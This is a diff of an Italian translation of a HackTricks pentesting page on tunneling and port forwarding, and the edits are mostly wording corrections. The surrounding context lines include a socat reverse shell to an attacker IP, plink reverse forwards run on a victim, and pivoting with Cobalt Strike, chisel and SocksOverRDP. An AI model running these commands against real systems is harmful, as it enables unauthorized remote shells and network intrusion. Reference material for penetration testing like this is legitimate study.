@@ -1,8 +1,8 @@
 # Tunneling e Port Forwarding
 
 {% hint style="success" %}
-Impara e pratica il Hacking AWS:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
-Impara e pratica il Hacking GCP: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Impara e pratica Hacking AWS:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
+Impara e pratica Hacking GCP: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
@@ -103,7 +103,7 @@ route add -net 10.0.0.0/16 gw 1.1.1.1
 ```
 ## SSHUTTLE
 
-Puoi **tunneling** tramite **ssh** tutto il **traffico** verso una **sottorete** attraverso un host.\
+Puoi **tunnel** tramite **ssh** tutto il **traffico** verso una **sottorete** attraverso un host.\
 Ad esempio, inoltrando tutto il traffico che va a 10.10.10.0/24
 ```bash
 pip install sshuttle
@@ -174,7 +174,7 @@ To note:
 ### rPort2Port locale
 
 {% hint style="warning" %}
-In questo caso, il **port è aperto nell'host beacon**, non nel Team Server e il **traffico è inviato al client Cobalt Strike** (non al Team Server) e da lì all'host:port indicato.
+In questo caso, la **porta è aperta nell'host beacon**, non nel Team Server e il **traffico è inviato al client Cobalt Strike** (non al Team Server) e da lì all'host:porta indicato.
 {% endhint %}
 ```
 rportfwd_local [bind port] [forward host] [forward port]
@@ -191,7 +191,7 @@ python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/t
 ## Chisel
 
 Puoi scaricarlo dalla pagina delle release di [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)\
-Devi utilizzare la **stessa versione per client e server**
+Devi usare la **stessa versione per client e server**
 
 ### socks
 ```bash
@@ -282,7 +282,7 @@ victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
 ```bash
 socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
 ```
-### Port2Port tramite socks
+### Port2Port attraverso socks
 ```bash
 socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
 ```
@@ -332,7 +332,7 @@ attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh o
 
 È come una versione console di PuTTY (le opzioni sono molto simili a quelle di un client ssh).
 
-Poiché questo binario verrà eseguito nella vittima ed è un client ssh, dobbiamo aprire il nostro servizio ssh e la porta in modo da poter avere una connessione inversa. Quindi, per inoltrare solo la porta accessibile localmente a una porta nella nostra macchina:
+Poiché questo binario verrà eseguito nella vittima ed è un client ssh, dobbiamo aprire il nostro servizio ssh e la porta in modo da poter avere una connessione inversa. Quindi, per inoltrare solo una porta accessibile localmente a una porta nella nostra macchina:
 ```bash
 echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
 echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
@@ -366,7 +366,7 @@ C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
 ```
 Ora possiamo **connetterci** alla **vittima** tramite **RDP** utilizzando **`mstsc.exe`**, e dovremmo ricevere un **messaggio** che dice che il **plugin SocksOverRDP è abilitato**, e che **ascolterà** su **127.0.0.1:1080**.
 
-**Connetti** tramite **RDP** e carica ed esegui nella macchina della vittima il binario `SocksOverRDP-Server.exe`:
+**Connetti** tramite **RDP** e carica ed esegui nella macchina della vittima il file binario `SocksOverRDP-Server.exe`:
 ```
 C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
 ```
@@ -374,11 +374,11 @@ Ora, conferma nella tua macchina (attaccante) che la porta 1080 è in ascolto:
 ```
 netstat -antb | findstr 1080
 ```
-Ora puoi usare [**Proxifier**](https://www.proxifier.com/) **per proxy il traffico attraverso quella porta.**
+Ora puoi usare [**Proxifier**](https://www.proxifier.com/) **per fare il proxy del traffico attraverso quella porta.**
 
 ## Proxifica le app GUI di Windows
 
-Puoi far navigare le app GUI di Windows attraverso un proxy usando [**Proxifier**](https://www.proxifier.com/).\
+Puoi fare in modo che le app GUI di Windows navigano attraverso un proxy usando [**Proxifier**](https://www.proxifier.com/).\
 In **Profile -> Proxy Servers** aggiungi l'IP e la porta del server SOCKS.\
 In **Profile -> Proxification Rules** aggiungi il nome del programma da proxificare e le connessioni agli IP che vuoi proxificare.
 
@@ -393,7 +393,7 @@ http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
 
 [http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)
 
-Si autentica contro un proxy e associa una porta localmente che viene inoltrata al servizio esterno specificato. Poi, puoi utilizzare lo strumento di tua scelta attraverso questa porta.\
+Autenticandosi contro un proxy, crea un binding di una porta localmente che viene inoltrata al servizio esterno specificato. Poi, puoi utilizzare lo strumento di tua scelta attraverso questa porta.\
 Ad esempio, inoltra la porta 443.
 ```
 Username Alice
